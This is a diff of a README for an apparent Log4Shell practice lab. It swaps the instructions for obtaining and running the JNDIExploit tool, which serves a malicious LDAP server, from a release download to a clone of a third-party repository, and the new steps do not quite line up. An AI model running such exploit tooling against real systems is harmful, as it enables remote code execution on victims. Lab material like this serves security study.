@@ -28,9 +28,10 @@ docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 * Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
 
 ```bash
-wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
-unzip JNDIExploit.v1.2.zip
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+    git clone https://github.com/black9/Log4shell_JNDIExploit.git
+    unzip JNDIExploit.v1.2.zip
+    cd JNDIExploit.v1.2
+    java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
 
 * Then, trigger the exploit using:
